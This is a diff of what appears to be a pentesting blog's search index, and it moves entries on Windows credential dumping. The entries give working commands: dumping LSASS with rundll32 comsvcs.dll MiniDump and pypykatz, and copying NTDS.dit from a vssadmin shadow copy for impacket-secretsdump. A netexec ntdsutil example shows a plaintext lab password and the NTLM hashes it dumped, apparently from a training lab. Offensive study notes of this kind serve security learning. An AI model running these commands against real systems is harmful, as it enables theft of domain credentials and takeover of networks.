@@ -37,6 +37,32 @@
       </tags>
   </entry>
   <entry>
+    <title>Dump Lsass</title>
+    <url>/2025/11/26/Dump-Lsass/</url>
+    <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
+<p><img src="/img/task-manager.png" alt="Select the process"></p>
+<p>Create a dump file</p>
+<p><img src="/img/dump-lsass.png" alt="dump lsass"></p>
+<p>➜ And then we can find the created file on &#96;C:\Users\username\AppData\Local\Temp\Lsass.DMP.</p>
+<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><h4 id="Finding-LSASS’s-PID-in-PowerShell"><a href="#Finding-LSASS’s-PID-in-PowerShell" class="headerlink" title="Finding LSASS’s PID in PowerShell"></a>Finding LSASS’s PID in PowerShell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-Process</span> lsass</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">   <span class="number">1260</span>      <span class="number">21</span>     <span class="number">4948</span>      <span class="number">15396</span>       <span class="number">2.56</span>    <span class="number">672</span>   <span class="number">0</span> lsass</span><br></pre></td></tr></table></figure>
+
+<h4 id="Creating-a-dump-file-using-PowerShell"><a href="#Creating-a-dump-file-using-PowerShell" class="headerlink" title="Creating a dump file using PowerShell"></a>Creating a dump file using PowerShell</h4><p>➜ We need <code>Administrator access</code>.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="number">672</span> C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Dump-Lsass-Offline"><a href="#Dump-Lsass-Offline" class="headerlink" title="Dump Lsass Offline"></a>Dump Lsass Offline</h2><p>➜ After creating a dump file, we can now dump the lsass file offline :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp </span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-Lsass</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DPAPI</title>
     <url>/2025/11/26/DPAPI/</url>
     <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
@@ -90,21 +116,32 @@
       </tags>
   </entry>
   <entry>
-    <title>Dump Lsass</title>
-    <url>/2025/11/26/Dump-Lsass/</url>
-    <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
-<p><img src="/img/task-manager.png" alt="Select the process"></p>
-<p>Create a dump file</p>
-<p><img src="/img/dump-lsass.png" alt="dump lsass"></p>
-<p>➜ And then we can find the created file on &#96;C:\Users\username\AppData\Local\Temp\Lsass.DMP.</p>
-<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><h4 id="Finding-LSASS’s-PID-in-PowerShell"><a href="#Finding-LSASS’s-PID-in-PowerShell" class="headerlink" title="Finding LSASS’s PID in PowerShell"></a>Finding LSASS’s PID in PowerShell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-Process</span> lsass</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">   <span class="number">1260</span>      <span class="number">21</span>     <span class="number">4948</span>      <span class="number">15396</span>       <span class="number">2.56</span>    <span class="number">672</span>   <span class="number">0</span> lsass</span><br></pre></td></tr></table></figure>
+    <title>Dump NTDS</title>
+    <url>/2025/11/26/Dump-NTDS/</url>
+    <content><![CDATA[<p>➜ Required privilege </p>
+<ul>
+<li><p><code>Member of Domain Admins (DA)</code></p>
+</li>
+<li><p><code>Member of Enterprise Admins (EA)</code></p>
+</li>
+<li><p><code>Member of local Administrators group on the DC</code></p>
+</li>
+<li><p><code>Backup Operators ( SeBackupPrivilege )</code></p>
+</li>
+</ul>
+<h1 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h1><h3 id="Creating-shadow-copy-of-C"><a href="#Creating-shadow-copy-of-C" class="headerlink" title="Creating shadow copy of C:"></a>Creating shadow copy of C:</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; vssadmin CREATE SHADOW /For=C:</span><br><span class="line"></span><br><span class="line">Successfully created shadow copy <span class="keyword">for</span> <span class="string">&#x27;C:\&#x27;</span></span><br><span class="line">    Shadow Copy ID: &#123;186d5979-2f2b-4afe-8101-9f1111e4cb1a&#125;</span><br><span class="line">    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</span><br></pre></td></tr></table></figure>
 
-<h4 id="Creating-a-dump-file-using-PowerShell"><a href="#Creating-a-dump-file-using-PowerShell" class="headerlink" title="Creating a dump file using PowerShell"></a>Creating a dump file using PowerShell</h4><p>➜ We need <code>Administrator access</code>.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="number">672</span> C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
+<h3 id="Copying-NTDS-dit-from-the-VSS"><a href="#Copying-NTDS-dit-from-the-VSS" class="headerlink" title="Copying NTDS.dit from the VSS"></a>Copying NTDS.dit from the VSS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\NTDS&gt; cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit</span><br></pre></td></tr></table></figure>
 
 
-<h2 id="Dump-Lsass-Offline"><a href="#Dump-Lsass-Offline" class="headerlink" title="Dump Lsass Offline"></a>Dump Lsass Offline</h2><p>➜ After creating a dump file, we can now dump the lsass file offline :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp </span><br></pre></td></tr></table></figure>]]></content>
+<h3 id="Dump-hashes"><a href="#Dump-hashes" class="headerlink" title="Dump hashes"></a>Dump hashes</h3><p>➜ Since the hashes stored in <code>NTDS.dit</code> are encrypted with a key stored in <code>SYSTEM</code>, we need to transfer the <code>SYSTEM</code> registry with <code>NTDS.dit</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h1><h3 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil</span><br><span class="line"></span><br><span class="line">NTDSUTIL    10.129.201.57   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::</span><br><span class="line">NTDSUTIL    10.129.201.57   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Windows</category>
@@ -112,7 +149,7 @@
         <category>Dump-Passwords</category>
       </categories>
       <tags>
-        <tag>Dump-Lsass</tag>
+        <tag>Dump-NTDS</tag>
       </tags>
   </entry>
   <entry>
@@ -152,43 +189,6 @@
       </categories>
       <tags>
         <tag>Dump-SAM</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Dump NTDS</title>
-    <url>/2025/11/26/Dump-NTDS/</url>
-    <content><![CDATA[<p>➜ Required privilege </p>
-<ul>
-<li><p><code>Member of Domain Admins (DA)</code></p>
-</li>
-<li><p><code>Member of Enterprise Admins (EA)</code></p>
-</li>
-<li><p><code>Member of local Administrators group on the DC</code></p>
-</li>
-<li><p><code>Backup Operators ( SeBackupPrivilege )</code></p>
-</li>
-</ul>
-<h1 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h1><h3 id="Creating-shadow-copy-of-C"><a href="#Creating-shadow-copy-of-C" class="headerlink" title="Creating shadow copy of C:"></a>Creating shadow copy of C:</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; vssadmin CREATE SHADOW /For=C:</span><br><span class="line"></span><br><span class="line">Successfully created shadow copy <span class="keyword">for</span> <span class="string">&#x27;C:\&#x27;</span></span><br><span class="line">    Shadow Copy ID: &#123;186d5979-2f2b-4afe-8101-9f1111e4cb1a&#125;</span><br><span class="line">    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</span><br></pre></td></tr></table></figure>
-
-<h3 id="Copying-NTDS-dit-from-the-VSS"><a href="#Copying-NTDS-dit-from-the-VSS" class="headerlink" title="Copying NTDS.dit from the VSS"></a>Copying NTDS.dit from the VSS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\NTDS&gt; cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Dump-hashes"><a href="#Dump-hashes" class="headerlink" title="Dump hashes"></a>Dump hashes</h3><p>➜ Since the hashes stored in <code>NTDS.dit</code> are encrypted with a key stored in <code>SYSTEM</code>, we need to transfer the <code>SYSTEM</code> registry with <code>NTDS.dit</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h1><h3 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil</span><br><span class="line"></span><br><span class="line">NTDSUTIL    10.129.201.57   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::</span><br><span class="line">NTDSUTIL    10.129.201.57   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-NTDS</tag>
       </tags>
   </entry>
   <entry>
@@ -461,6 +461,7 @@
 
 ]]></content>
       <categories>
+        <category>Active Directory</category>
         <category>Service-Exploitation</category>
         <category>MySQL</category>
       </categories>
